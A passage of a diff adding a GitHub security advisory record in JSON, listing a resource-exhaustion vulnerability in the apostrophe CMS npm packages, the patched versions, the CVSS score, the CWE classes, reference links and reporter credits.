+      {
+        "value": "CVE-2026-113711",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-86wm-68pq-5jwq",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-113711",
+      "https://github.com/apostrophecms/apostrophe/commit/9500b8b0e1d630d5e07fbb5fd2c25ed0943845ce",
+      "https://github.com/apostrophecms/apostrophe/commit/f84fd41cbf6c22eb8d0008fc9c25df1f7130b350",
+      "https://github.com/apostrophecms/apostrophe/releases/tag/apostrophe@4.33.0",
+      "https://github.com/advisories/GHSA-86wm-68pq-5jwq"
+    ],
+    "published_at": "2026-10-21T13:51:21Z",
+    "updated_at": "2026-10-21T13:51:22Z",
+    "github_reviewed_at": "2026-10-21T13:51:21Z",
+    "nvd_published_at": "2026-10-20T18:17:21Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "apostrophe"
+        },
+        "vulnerable_version_range": "< 4.33.0",
+        "first_patched_version": "4.33.0",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "@apostrophecms/import-export"
+        },
+        "vulnerable_version_range": "< 3.7.0",
+        "first_patched_version": "3.7.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "score": 7.5
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-400",
+        "name": "Uncontrolled Resource Consumption"
+      },
+      {
+        "cwe_id": "CWE-770",
+        "name": "Allocation of Resources Without Limits or Throttling"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "kaizhi888",
+          "id": 141372104,
+          "node_id": "U_kgDOCG0qyA",
+          "avatar_url": "https://avatars.githubusercontent.com/u/141372104?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/kaizhi888",
+          "html_url": "https://github.com/kaizhi888",
+          "followers_url": "https://api.github.com/users/kaizhi888/followers",
+          "following_url": "https://api.github.com/users/kaizhi888/following{/other_user}",
+          "gists_url": "https://api.github.com/users/kaizhi888/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/kaizhi888/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/kaizhi888/subscriptions",
+          "organizations_url": "https://api.github.com/users/kaizhi888/orgs",
+          "repos_url": "https://api.github.com/users/kaizhi888/repos",
+          "events_url": "https://api.github.com/users/kaizhi888/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/kaizhi888/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "bp0lr",
+          "id": 5620128,
+          "node_id": "MDQ6VXNlcjU2MjAxMjg=",
+          "avatar_url": "https://avatars.githubusercontent.com/u/5620128?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/bp0lr",
+          "html_url": "https://github.com/bp0lr",
+          "followers_url": "https://api.github.com/users/bp0lr/followers",
+          "following_url": "https://api.github.com/users/bp0lr/following{/other_user}",
+          "gists_url": "https://api.github.com/users/bp0lr/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/bp0lr/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/bp0lr/subscriptions",
+          "organizations_url": "https://api.github.com/users/bp0lr/orgs",
+          "repos_url": "https://api.github.com/users/bp0lr/repos",
+          "events_url": "https://api.github.com/users/bp0lr/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/bp0lr/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "comments": 3,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "score": 7.5
+    }
+  }
+]
